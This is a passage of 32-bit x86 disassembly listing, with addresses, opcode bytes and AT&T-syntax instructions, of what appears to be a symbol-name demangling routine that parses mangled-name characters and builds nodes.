  4048d1:	0f 84 62 01 00 00    	je     0x404a39
  4048d7:	80 fa 69             	cmp    $0x69,%dl
  4048da:	0f 85 00 fd ff ff    	jne    0x4045e0
  4048e0:	80 78 01 6c          	cmpb   $0x6c,0x1(%eax)
  4048e4:	0f 85 f6 fc ff ff    	jne    0x4045e0
  4048ea:	89 d8                	mov    %ebx,%eax
  4048ec:	e8 cf f9 ff ff       	call   0x4042c0
  4048f1:	e9 25 ff ff ff       	jmp    0x40481b
  4048f6:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4048fd:	8d 76 00             	lea    0x0(%esi),%esi
  404900:	83 f8 64             	cmp    $0x64,%eax
  404903:	0f 85 cc 00 00 00    	jne    0x4049d5
  404909:	80 7f 01 74          	cmpb   $0x74,0x1(%edi)
  40490d:	0f 85 c2 00 00 00    	jne    0x4049d5
  404913:	80 7f 02 00          	cmpb   $0x0,0x2(%edi)
  404917:	0f 85 b8 00 00 00    	jne    0x4049d5
  40491d:	8b 43 0c             	mov    0xc(%ebx),%eax
  404920:	0f b6 10             	movzbl (%eax),%edx
  404923:	80 fa 67             	cmp    $0x67,%dl
  404926:	0f 84 e7 00 00 00    	je     0x404a13
  40492c:	80 fa 73             	cmp    $0x73,%dl
  40492f:	75 0a                	jne    0x40493b
  404931:	80 78 01 72          	cmpb   $0x72,0x1(%eax)
  404935:	0f 84 af 00 00 00    	je     0x4049ea
  40493b:	31 c9                	xor    %ecx,%ecx
  40493d:	31 d2                	xor    %edx,%edx
  40493f:	89 d8                	mov    %ebx,%eax
  404941:	e8 4a ee ff ff       	call   0x403790
  404946:	89 c7                	mov    %eax,%edi
  404948:	8b 43 0c             	mov    0xc(%ebx),%eax
  40494b:	80 38 49             	cmpb   $0x49,(%eax)
  40494e:	0f 85 aa fd ff ff    	jne    0x4046fe
  404954:	83 c0 01             	add    $0x1,%eax
  404957:	89 43 0c             	mov    %eax,0xc(%ebx)
  40495a:	89 d8                	mov    %ebx,%eax
  40495c:	e8 ef f6 ff ff       	call   0x404050
  404961:	89 f9                	mov    %edi,%ecx
  404963:	ba 04 00 00 00       	mov    $0x4,%edx
  404968:	89 04 24             	mov    %eax,(%esp)
  40496b:	89 d8                	mov    %ebx,%eax
  40496d:	e8 4e d1 ff ff       	call   0x401ac0
  404972:	89 c7                	mov    %eax,%edi
  404974:	e9 85 fd ff ff       	jmp    0x4046fe
  404979:	83 e8 43             	sub    $0x43,%eax
  40497c:	ba 01 02 04 00       	mov    $0x40201,%edx
  404981:	0f a3 c2             	bt     %eax,%edx
  404984:	0f 83 92 fb ff ff    	jae    0x40451c
  40498a:	c7 43 38 ff ff ff ff 	movl   $0xffffffff,0x38(%ebx)
  404991:	31 d2                	xor    %edx,%edx
  404993:	89 d8                	mov    %ebx,%eax
  404995:	e8 c6 f7 ff ff       	call   0x404160
  40499a:	89 c2                	mov    %eax,%edx
  40499c:	8b 43 0c             	mov    0xc(%ebx),%eax
  40499f:	80 38 45             	cmpb   $0x45,(%eax)
  4049a2:	0f 85 7d fb ff ff    	jne    0x404525
  4049a8:	83 c0 01             	add    $0x1,%eax
  4049ab:	89 43 0c             	mov    %eax,0xc(%ebx)
  4049ae:	e9 72 fb ff ff       	jmp    0x404525
  4049b3:	8d 4a 8e             	lea    -0x72(%edx),%ecx
  4049b6:	80 f9 01             	cmp    $0x1,%cl
  4049b9:	76 0c                	jbe    0x4049c7
  4049bb:	8d 4a 9d             	lea    -0x63(%edx),%ecx
  4049be:	80 f9 01             	cmp    $0x1,%cl
  4049c1:	0f 87 d6 fc ff ff    	ja     0x40469d
  4049c7:	89 d8                	mov    %ebx,%eax
  4049c9:	e8 32 df ff ff       	call   0x402900
  4049ce:	89 c5                	mov    %eax,%ebp
  4049d0:	e9 fb fc ff ff       	jmp    0x4046d0
  4049d5:	83 f8 70             	cmp    $0x70,%eax
  4049d8:	75 10                	jne    0x4049ea
  4049da:	80 7f 01 74          	cmpb   $0x74,0x1(%edi)
  4049de:	75 0a                	jne    0x4049ea
  4049e0:	80 7f 02 00          	cmpb   $0x0,0x2(%edi)
  4049e4:	0f 84 33 ff ff ff    	je     0x40491d
  4049ea:	89 d8                	mov    %ebx,%eax
  4049ec:	e8 cf f8 ff ff       	call   0x4042c0
  4049f1:	89 c7                	mov    %eax,%edi
  4049f3:	e9 06 fd ff ff       	jmp    0x4046fe
  4049f8:	83 e8 61             	sub    $0x61,%eax
  4049fb:	3c 19                	cmp    $0x19,%al
  4049fd:	0f 87 19 fb ff ff    	ja     0x40451c
  404a03:	eb 85                	jmp    0x40498a
  404a05:	89 d8                	mov    %ebx,%eax
  404a07:	e8 b4 f8 ff ff       	call   0x4042c0
  404a0c:	89 c5                	mov    %eax,%ebp
  404a0e:	e9 bd fc ff ff       	jmp    0x4046d0
  404a13:	80 78 01 73          	cmpb   $0x73,0x1(%eax)
  404a17:	0f 85 1e ff ff ff    	jne    0x40493b
  404a1d:	eb cb                	jmp    0x4049ea
  404a1f:	89 d8                	mov    %ebx,%eax
  404a21:	e8 9a eb ff ff       	call   0x4035c0
  404a26:	89 c5                	mov    %eax,%ebp
  404a28:	e9 a3 fc ff ff       	jmp    0x4046d0
  404a2d:	89 d8                	mov    %ebx,%eax
  404a2f:	e8 8c eb ff ff       	call   0x4035c0
  404a34:	e9 c8 fd ff ff       	jmp    0x404801
  404a39:	80 78 01 69          	cmpb   $0x69,0x1(%eax)
  404a3d:	0f 85 9d fb ff ff    	jne    0x4045e0
  404a43:	83 c0 02             	add    $0x2,%eax
  404a46:	ba 45 00 00 00       	mov    $0x45,%edx
  404a4b:	89 43 0c             	mov    %eax,0xc(%ebx)
  404a4e:	89 d8                	mov    %ebx,%eax
  404a50:	e8 0b 02 00 00       	call   0x404c60
  404a55:	e9 c1 fd ff ff       	jmp    0x40481b
  404a5a:	83 c0 01             	add    $0x1,%eax
  404a5d:	89 43 0c             	mov    %eax,0xc(%ebx)
  404a60:	31 c0                	xor    %eax,%eax
  404a62:	e9 b4 fd ff ff       	jmp    0x40481b
  404a67:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404a6e:	66 90                	xchg   %ax,%ax
  404a70:	55                   	push   %ebp
  404a71:	57                   	push   %edi
  404a72:	56                   	push   %esi
  404a73:	53                   	push   %ebx
  404a74:	89 c3                	mov    %eax,%ebx
  404a76:	89 d0                	mov    %edx,%eax
  404a78:	89 ca                	mov    %ecx,%edx
  404a7a:	83 e2 01             	and    $0x1,%edx
  404a7d:	89 c5                	mov    %eax,%ebp
  404a7f:	83 ec 3c             	sub    $0x3c,%esp
  404a82:	80 fa 01             	cmp    $0x1,%dl
  404a85:	8b 73 0c             	mov    0xc(%ebx),%esi
  404a88:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  404a8c:	19 c9                	sbb    %ecx,%ecx
  404a8e:	83 e1 fd             	and    $0xfffffffd,%ecx
  404a91:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  404a95:	0f b6 3e             	movzbl (%esi),%edi
  404a98:	83 c1 1e             	add    $0x1e,%ecx
  404a9b:	80 fa 01             	cmp    $0x1,%dl
  404a9e:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  404aa2:	19 c9                	sbb    %ecx,%ecx
  404aa4:	83 e1 fd             	and    $0xfffffffd,%ecx
  404aa7:	83 c1 1d             	add    $0x1d,%ecx
  404aaa:	80 fa 01             	cmp    $0x1,%dl
  404aad:	19 d2                	sbb    %edx,%edx
  404aaf:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  404ab3:	83 e2 fd             	and    $0xfffffffd,%edx
  404ab6:	83 c2 1c             	add    $0x1c,%edx
  404ab9:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  404abd:	eb 6d                	jmp    0x404b2c
  404abf:	90                   	nop
  404ac0:	3c 56                	cmp    $0x56,%al
  404ac2:	0f 84 98 00 00 00    	je     0x404b60
  404ac8:	3c 4b                	cmp    $0x4b,%al
  404aca:	0f 84 d0 00 00 00    	je     0x404ba0
  404ad0:	80 7e 01 00          	cmpb   $0x0,0x1(%esi)
  404ad4:	0f 84 b6 00 00 00    	je     0x404b90
  404ada:	8d 46 02             	lea    0x2(%esi),%eax
  404add:	89 43 0c             	mov    %eax,0xc(%ebx)
  404ae0:	0f b6 4e 01          	movzbl 0x1(%esi),%ecx
  404ae4:	80 f9 78             	cmp    $0x78,%cl
  404ae7:	0f 84 c3 00 00 00    	je     0x404bb0
  404aed:	89 c8                	mov    %ecx,%eax
  404aef:	83 e0 df             	and    $0xffffffdf,%eax
  404af2:	3c 4f                	cmp    $0x4f,%al
  404af4:	0f 85 2e 01 00 00    	jne    0x404c28
  404afa:	83 43 2c 09          	addl   $0x9,0x2c(%ebx)
  404afe:	31 c0                	xor    %eax,%eax
  404b00:	ba 52 00 00 00       	mov    $0x52,%edx
  404b05:	80 f9 4f             	cmp    $0x4f,%cl
  404b08:	74 66                	je     0x404b70
  404b0a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404b10:	89 04 24             	mov    %eax,(%esp)
  404b13:	31 c9                	xor    %ecx,%ecx
  404b15:	89 d8                	mov    %ebx,%eax
  404b17:	e8 a4 cf ff ff       	call   0x401ac0
  404b1c:	89 45 00             	mov    %eax,0x0(%ebp)
  404b1f:	85 c0                	test   %eax,%eax
  404b21:	74 6d                	je     0x404b90
  404b23:	8b 73 0c             	mov    0xc(%ebx),%esi
  404b26:	8d 68 0c             	lea    0xc(%eax),%ebp
  404b29:	0f b6 3e             	movzbl (%esi),%edi
  404b2c:	89 f0                	mov    %esi,%eax
  404b2e:	e8 7d d5 ff ff       	call   0x4020b0
  404b33:	85 c0                	test   %eax,%eax
  404b35:	0f 84 a5 00 00 00    	je     0x404be0
  404b3b:	8d 46 01             	lea    0x1(%esi),%eax
  404b3e:	89 43 0c             	mov    %eax,0xc(%ebx)
  404b41:	89 f8                	mov    %edi,%eax
  404b43:	3c 72                	cmp    $0x72,%al
  404b45:	0f 85 75 ff ff ff    	jne    0x404ac0
  404b4b:	83 43 2c 09          	addl   $0x9,0x2c(%ebx)
  404b4f:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  404b53:	31 c0                	xor    %eax,%eax
  404b55:	eb b9                	jmp    0x404b10
  404b57:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404b5e:	66 90                	xchg   %ax,%ax
  404b60:	83 43 2c 09          	addl   $0x9,0x2c(%ebx)
  404b64:	8b 54 24 20          	mov    0x20(%esp),%edx
  404b68:	31 c0                	xor    %eax,%eax
  404b6a:	eb a4                	jmp    0x404b10
  404b6c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404b70:	8b 73 30             	mov    0x30(%ebx),%esi
  404b73:	c7 43 30 01 00 00 00 	movl   $0x1,0x30(%ebx)
  404b7a:	89 d8                	mov    %ebx,%eax
  404b7c:	e8 3f f7 ff ff       	call   0x4042c0
  404b81:	89 73 30             	mov    %esi,0x30(%ebx)
  404b84:	85 c0                	test   %eax,%eax
  404b86:	75 38                	jne    0x404bc0
  404b88:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404b8f:	90                   	nop
  404b90:	31 ed                	xor    %ebp,%ebp
  404b92:	83 c4 3c             	add    $0x3c,%esp
  404b95:	89 e8                	mov    %ebp,%eax
  404b97:	5b                   	pop    %ebx
  404b98:	5e                   	pop    %esi
  404b99:	5f                   	pop    %edi
  404b9a:	5d                   	pop    %ebp
  404b9b:	c3                   	ret
  404b9c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404ba0:	83 43 2c 06          	addl   $0x6,0x2c(%ebx)
  404ba4:	8b 54 24 24          	mov    0x24(%esp),%edx
  404ba8:	31 c0                	xor    %eax,%eax
  404baa:	e9 61 ff ff ff       	jmp    0x404b10
  404baf:	90                   	nop
  404bb0:	83 43 2c 11          	addl   $0x11,0x2c(%ebx)
  404bb4:	31 c0                	xor    %eax,%eax
  404bb6:	ba 4f 00 00 00       	mov    $0x4f,%edx
  404bbb:	e9 50 ff ff ff       	jmp    0x404b10
  404bc0:	8b 53 0c             	mov    0xc(%ebx),%edx
  404bc3:	80 3a 45             	cmpb   $0x45,(%edx)
  404bc6:	75 c8                	jne    0x404b90
  404bc8:	83 c2 01             	add    $0x1,%edx
  404bcb:	89 53 0c             	mov    %edx,0xc(%ebx)
  404bce:	ba 52 00 00 00       	mov    $0x52,%edx
  404bd3:	e9 38 ff ff ff       	jmp    0x404b10
  404bd8:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404bdf:	90                   	nop
  404be0:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404be4:	f6 44 24 28 01       	testb  $0x1,0x28(%esp)
  404be9:	75 a7                	jne    0x404b92
  404beb:	89 f9                	mov    %edi,%ecx
  404bed:	80 f9 46             	cmp    $0x46,%cl
  404bf0:	74 19                	je     0x404c0b
  404bf2:	eb 9e                	jmp    0x404b92
  404bf4:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404bf8:	83 fa 1b             	cmp    $0x1b,%edx
  404bfb:	74 23                	je     0x404c20
  404bfd:	83 fa 19             	cmp    $0x19,%edx
  404c00:	75 06                	jne    0x404c08
  404c02:	c7 00 1c 00 00 00    	movl   $0x1c,(%eax)
  404c08:	83 c0 0c             	add    $0xc,%eax
  404c0b:	39 c5                	cmp    %eax,%ebp
  404c0d:	74 83                	je     0x404b92
  404c0f:	8b 00                	mov    (%eax),%eax
  404c11:	8b 10                	mov    (%eax),%edx
  404c13:	83 fa 1a             	cmp    $0x1a,%edx
  404c16:	75 e0                	jne    0x404bf8
  404c18:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  404c1e:	eb e8                	jmp    0x404c08
  404c20:	c7 00 1e 00 00 00    	movl   $0x1e,(%eax)
  404c26:	eb e0                	jmp    0x404c08
  404c28:	80 f9 77             	cmp    $0x77,%cl
  404c2b:	0f 85 5f ff ff ff    	jne    0x404b90
  404c31:	83 43 2c 06          	addl   $0x6,0x2c(%ebx)
  404c35:	89 d8                	mov    %ebx,%eax
  404c37:	e8 94 e6 ff ff       	call   0x4032d0
  404c3c:	85 c0                	test   %eax,%eax
  404c3e:	0f 84 4c ff ff ff    	je     0x404b90
  404c44:	8b 53 0c             	mov    0xc(%ebx),%edx
  404c47:	80 3a 45             	cmpb   $0x45,(%edx)
  404c4a:	0f 85 40 ff ff ff    	jne    0x404b90
  404c50:	83 c2 01             	add    $0x1,%edx
  404c53:	89 53 0c             	mov    %edx,0xc(%ebx)
  404c56:	ba 53 00 00 00       	mov    $0x53,%edx
  404c5b:	e9 b0 fe ff ff       	jmp    0x404b10
  404c60:	55                   	push   %ebp
  404c61:	57                   	push   %edi
  404c62:	56                   	push   %esi
  404c63:	53                   	push   %ebx
  404c64:	89 c3                	mov    %eax,%ebx
  404c66:	83 ec 2c             	sub    $0x2c,%esp
  404c69:	8b 40 0c             	mov    0xc(%eax),%eax
  404c6c:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  404c73:	00 
  404c74:	38 10                	cmp    %dl,(%eax)
  404c76:	74 70                	je     0x404ce8
  404c78:	8b 7b 30             	mov    0x30(%ebx),%edi
  404c7b:	89 d5                	mov    %edx,%ebp
  404c7d:	8d 74 24 1c          	lea    0x1c(%esp),%esi
  404c81:	eb 2a                	jmp    0x404cad
  404c83:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404c87:	90                   	nop
  404c88:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404c8f:	ba 2f 00 00 00       	mov    $0x2f,%edx
  404c94:	89 d8                	mov    %ebx,%eax
  404c96:	e8 25 ce ff ff       	call   0x401ac0
  404c9b:	89 06                	mov    %eax,(%esi)
  404c9d:	85 c0                	test   %eax,%eax
  404c9f:	74 23                	je     0x404cc4
  404ca1:	8d 70 10             	lea    0x10(%eax),%esi
  404ca4:	8b 43 0c             	mov    0xc(%ebx),%eax
  404ca7:	89 ea                	mov    %ebp,%edx
  404ca9:	38 10                	cmp    %dl,(%eax)
  404cab:	74 23                	je     0x404cd0
  404cad:	c7 43 30 01 00 00 00 	movl   $0x1,0x30(%ebx)
  404cb4:	89 d8                	mov    %ebx,%eax
  404cb6:	e8 05 f6 ff ff       	call   0x4042c0
  404cbb:	89 7b 30             	mov    %edi,0x30(%ebx)
  404cbe:	89 c1                	mov    %eax,%ecx
  404cc0:	85 c0                	test   %eax,%eax
  404cc2:	75 c4                	jne    0x404c88
  404cc4:	83 c4 2c             	add    $0x2c,%esp
  404cc7:	31 c0                	xor    %eax,%eax
  404cc9:	5b                   	pop    %ebx
  404cca:	5e                   	pop    %esi
  404ccb:	5f                   	pop    %edi
  404ccc:	5d                   	pop    %ebp
  404ccd:	c3                   	ret
  404cce:	66 90                	xchg   %ax,%ax
  404cd0:	83 c0 01             	add    $0x1,%eax
  404cd3:	89 43 0c             	mov    %eax,0xc(%ebx)
  404cd6:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  404cda:	83 c4 2c             	add    $0x2c,%esp
  404cdd:	5b                   	pop    %ebx
  404cde:	5e                   	pop    %esi
  404cdf:	5f                   	pop    %edi
  404ce0:	5d                   	pop    %ebp
  404ce1:	c3                   	ret
  404ce2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404ce8:	83 c0 01             	add    $0x1,%eax
  404ceb:	31 c9                	xor    %ecx,%ecx
  404ced:	ba 2f 00 00 00       	mov    $0x2f,%edx
  404cf2:	89 43 0c             	mov    %eax,0xc(%ebx)
  404cf5:	89 d8                	mov    %ebx,%eax
  404cf7:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404cfe:	e8 bd cd ff ff       	call   0x401ac0
  404d03:	83 c4 2c             	add    $0x2c,%esp
  404d06:	5b                   	pop    %ebx
  404d07:	5e                   	pop    %esi
  404d08:	5f                   	pop    %edi
  404d09:	5d                   	pop    %ebp
  404d0a:	c3                   	ret
  404d0b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  404d0f:	90                   	nop
  404d10:	55                   	push   %ebp
  404d11:	57                   	push   %edi
  404d12:	56                   	push   %esi
  404d13:	53                   	push   %ebx
  404d14:	89 c3                	mov    %eax,%ebx
  404d16:	83 ec 3c             	sub    $0x3c,%esp
  404d19:	8b 48 2c             	mov    0x2c(%eax),%ecx
  404d1c:	8d 41 14             	lea    0x14(%ecx),%eax
  404d1f:	89 43 2c             	mov    %eax,0x2c(%ebx)
  404d22:	8b 43 0c             	mov    0xc(%ebx),%eax
  404d25:	0f b6 10             	movzbl (%eax),%edx
  404d28:	80 fa 54             	cmp    $0x54,%dl
  404d2b:	74 43                	je     0x404d70
  404d2d:	80 fa 47             	cmp    $0x47,%dl
  404d30:	75 7e                	jne    0x404db0
  404d32:	8d 50 01             	lea    0x1(%eax),%edx
  404d35:	89 53 0c             	mov    %edx,0xc(%ebx)
  404d38:	80 78 01 00          	cmpb   $0x0,0x1(%eax)
  404d3c:	74 72                	je     0x404db0
  404d3e:	8d 50 02             	lea    0x2(%eax),%edx
  404d41:	89 53 0c             	mov    %edx,0xc(%ebx)
  404d44:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  404d48:	80 fa 56             	cmp    $0x56,%dl
  404d4b:	0f 8f bf 01 00 00    	jg     0x404f10
  404d51:	80 fa 40             	cmp    $0x40,%dl
  404d54:	7e 5a                	jle    0x404db0
  404d56:	83 ea 41             	sub    $0x41,%edx
  404d59:	80 fa 15             	cmp    $0x15,%dl
  404d5c:	77 52                	ja     0x404db0
  404d5e:	0f b6 d2             	movzbl %dl,%edx
  404d61:	ff 24 95 cc f8 42 00 	jmp    *0x42f8cc(,%edx,4)
  404d68:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404d6f:	90                   	nop
  404d70:	8d 50 01             	lea    0x1(%eax),%edx
  404d73:	89 53 0c             	mov    %edx,0xc(%ebx)
  404d76:	80 78 01 00          	cmpb   $0x0,0x1(%eax)
  404d7a:	74 34                	je     0x404db0
  404d7c:	8d 50 02             	lea    0x2(%eax),%edx
  404d7f:	89 53 0c             	mov    %edx,0xc(%ebx)
  404d82:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  404d86:	83 e8 41             	sub    $0x41,%eax
  404d89:	3c 35                	cmp    $0x35,%al
  404d8b:	77 23                	ja     0x404db0
  404d8d:	0f b6 c0             	movzbl %al,%eax
  404d90:	ff 24 85 24 f9 42 00 	jmp    *0x42f924(,%eax,4)
  404d97:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404d9e:	66 90                	xchg   %ax,%ax
  404da0:	89 73 0c             	mov    %esi,0xc(%ebx)
  404da3:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404daa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404db0:	31 c0                	xor    %eax,%eax
  404db2:	83 c4 3c             	add    $0x3c,%esp
  404db5:	5b                   	pop    %ebx
  404db6:	5e                   	pop    %esi
  404db7:	5f                   	pop    %edi
  404db8:	5d                   	pop    %ebp
  404db9:	c3                   	ret
  404dba:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404dc0:	31 d2                	xor    %edx,%edx
  404dc2:	89 d8                	mov    %ebx,%eax
  404dc4:	e8 c7 05 00 00       	call   0x405390
  404dc9:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404dd0:	ba 13 00 00 00       	mov    $0x13,%edx
  404dd5:	89 c1                	mov    %eax,%ecx
  404dd7:	89 d8                	mov    %ebx,%eax
  404dd9:	e8 e2 cc ff ff       	call   0x401ac0
  404dde:	eb d2                	jmp    0x404db2
  404de0:	80 78 02 00          	cmpb   $0x0,0x2(%eax)
  404de4:	0f 84 36 02 00 00    	je     0x405020
  404dea:	8d 50 03             	lea    0x3(%eax),%edx
  404ded:	89 53 0c             	mov    %edx,0xc(%ebx)
  404df0:	80 78 02 6e          	cmpb   $0x6e,0x2(%eax)
  404df4:	0f b6 40 03          	movzbl 0x3(%eax),%eax
  404df8:	0f 84 2f 05 00 00    	je     0x40532d
  404dfe:	3c 47                	cmp    $0x47,%al
  404e00:	74 08                	je     0x404e0a
  404e02:	3c 54                	cmp    $0x54,%al
  404e04:	0f 85 16 02 00 00    	jne    0x405020
  404e0a:	89 d8                	mov    %ebx,%eax
  404e0c:	e8 ff fe ff ff       	call   0x404d10
  404e11:	89 c1                	mov    %eax,%ecx
  404e13:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404e1a:	ba 4b 00 00 00       	mov    $0x4b,%edx
  404e1f:	89 d8                	mov    %ebx,%eax
  404e21:	e8 9a cc ff ff       	call   0x401ac0
  404e26:	eb 8a                	jmp    0x404db2
  404e28:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404e2f:	90                   	nop
  404e30:	31 d2                	xor    %edx,%edx
  404e32:	89 d8                	mov    %ebx,%eax
  404e34:	e8 57 05 00 00       	call   0x405390
  404e39:	89 c7                	mov    %eax,%edi
  404e3b:	8b 43 14             	mov    0x14(%ebx),%eax
  404e3e:	3b 43 18             	cmp    0x18(%ebx),%eax
  404e41:	0f 8d e9 01 00 00    	jge    0x405030
  404e47:	8b 53 10             	mov    0x10(%ebx),%edx
  404e4a:	8d 0c 80             	lea    (%eax,%eax,4),%ecx
  404e4d:	83 c0 01             	add    $0x1,%eax
  404e50:	8d 34 8a             	lea    (%edx,%ecx,4),%esi
  404e53:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  404e5a:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  404e61:	89 43 14             	mov    %eax,0x14(%ebx)
  404e64:	89 d8                	mov    %ebx,%eax
  404e66:	c7 06 44 00 00 00    	movl   $0x44,(%esi)
  404e6c:	e8 bf cd ff ff       	call   0x401c30
  404e71:	89 46 0c             	mov    %eax,0xc(%esi)
  404e74:	89 34 24             	mov    %esi,(%esp)
  404e77:	89 f9                	mov    %edi,%ecx
  404e79:	ba 16 00 00 00       	mov    $0x16,%edx
  404e7e:	89 d8                	mov    %ebx,%eax
  404e80:	e8 3b cc ff ff       	call   0x401ac0
  404e85:	e9 28 ff ff ff       	jmp    0x404db2
  404e8a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404e90:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  404e94:	89 d8                	mov    %ebx,%eax
  404e96:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  404e9d:	00 
  404e9e:	e8 cd d9 ff ff       	call   0x402870
  404ea3:	89 c2                	mov    %eax,%edx
  404ea5:	31 c0                	xor    %eax,%eax
  404ea7:	85 d2                	test   %edx,%edx
  404ea9:	0f 84 03 ff ff ff    	je     0x404db2
  404eaf:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404eb3:	85 c0                	test   %eax,%eax
  404eb5:	0f 84 f7 fe ff ff    	je     0x404db2
  404ebb:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404ec2:	89 c1                	mov    %eax,%ecx
  404ec4:	ba 58 00 00 00       	mov    $0x58,%edx
  404ec9:	89 d8                	mov    %ebx,%eax
  404ecb:	e8 f0 cb ff ff       	call   0x401ac0
  404ed0:	e9 dd fe ff ff       	jmp    0x404db2
  404ed5:	8d 76 00             	lea    0x0(%esi),%esi
  404ed8:	0f b6 40 02          	movzbl 0x2(%eax),%eax
  404edc:	3c 47                	cmp    $0x47,%al
  404ede:	0f 84 2c 01 00 00    	je     0x405010
  404ee4:	3c 54                	cmp    $0x54,%al
  404ee6:	0f 84 24 01 00 00    	je     0x405010
  404eec:	31 d2                	xor    %edx,%edx
  404eee:	89 d8                	mov    %ebx,%eax
  404ef0:	e8 eb 08 00 00       	call   0x4057e0
  404ef5:	89 c1                	mov    %eax,%ecx
  404ef7:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404efe:	ba 17 00 00 00       	mov    $0x17,%edx
  404f03:	89 d8                	mov    %ebx,%eax
  404f05:	e8 b6 cb ff ff       	call   0x401ac0
  404f0a:	e9 a3 fe ff ff       	jmp    0x404db2
  404f0f:	90                   	nop
  404f10:	80 fa 72             	cmp    $0x72,%dl
  404f13:	0f 85 97 fe ff ff    	jne    0x404db0
  404f19:	89 d8                	mov    %ebx,%eax
  404f1b:	e8 10 cd ff ff       	call   0x401c30
  404f20:	83 f8 01             	cmp    $0x1,%eax
  404f23:	0f 8e 87 fe ff ff    	jle    0x404db0
  404f29:	8b 53 0c             	mov    0xc(%ebx),%edx
  404f2c:	80 3a 00             	cmpb   $0x0,(%edx)
  404f2f:	0f 84 7b fe ff ff    	je     0x404db0
  404f35:	8d 72 01             	lea    0x1(%edx),%esi
  404f38:	89 73 0c             	mov    %esi,0xc(%ebx)
  404f3b:	80 3a 5f             	cmpb   $0x5f,(%edx)
  404f3e:	0f 85 6c fe ff ff    	jne    0x404db0
  404f44:	8d 78 ff             	lea    -0x1(%eax),%edi
  404f47:	31 ed                	xor    %ebp,%ebp
  404f49:	0f b6 06             	movzbl (%esi),%eax
  404f4c:	84 c0                	test   %al,%al
  404f4e:	0f 84 5c fe ff ff    	je     0x404db0
  404f54:	3c 24                	cmp    $0x24,%al
  404f56:	0f 85 54 03 00 00    	jne    0x4052b0
  404f5c:	0f b6 46 01          	movzbl 0x1(%esi),%eax
  404f60:	3c 53                	cmp    $0x53,%al
  404f62:	0f 84 a8 03 00 00    	je     0x405310
  404f68:	3c 5f                	cmp    $0x5f,%al
  404f6a:	0f 84 b0 03 00 00    	je     0x405320
  404f70:	3c 24                	cmp    $0x24,%al
  404f72:	0f 85 38 fe ff ff    	jne    0x404db0
  404f78:	c7 44 24 1c 24 00 00 	movl   $0x24,0x1c(%esp)
  404f7f:	00 
  404f80:	8b 43 0c             	mov    0xc(%ebx),%eax
  404f83:	8b 53 14             	mov    0x14(%ebx),%edx
  404f86:	8d 70 02             	lea    0x2(%eax),%esi
  404f89:	3b 53 18             	cmp    0x18(%ebx),%edx
  404f8c:	0f 8d 0e fe ff ff    	jge    0x404da0
  404f92:	8b 4b 10             	mov    0x10(%ebx),%ecx
  404f95:	8d 04 92             	lea    (%edx,%edx,4),%eax
  404f98:	83 c2 01             	add    $0x1,%edx
  404f9b:	83 ef 02             	sub    $0x2,%edi
  404f9e:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  404fa1:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404fa5:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  404fac:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  404fb3:	89 53 14             	mov    %edx,0x14(%ebx)
  404fb6:	c7 00 43 00 00 00    	movl   $0x43,(%eax)
  404fbc:	89 48 0c             	mov    %ecx,0xc(%eax)
  404fbf:	89 73 0c             	mov    %esi,0xc(%ebx)
  404fc2:	85 ed                	test   %ebp,%ebp
  404fc4:	0f 84 36 03 00 00    	je     0x405300
  404fca:	89 04 24             	mov    %eax,(%esp)
  404fcd:	89 e9                	mov    %ebp,%ecx
  404fcf:	ba 42 00 00 00       	mov    $0x42,%edx
  404fd4:	89 d8                	mov    %ebx,%eax
  404fd6:	e8 e5 ca ff ff       	call   0x401ac0
  404fdb:	89 c5                	mov    %eax,%ebp
  404fdd:	85 c0                	test   %eax,%eax
  404fdf:	0f 84 cb fd ff ff    	je     0x404db0
  404fe5:	85 ff                	test   %edi,%edi
  404fe7:	0f 8f 5c ff ff ff    	jg     0x404f49
  404fed:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
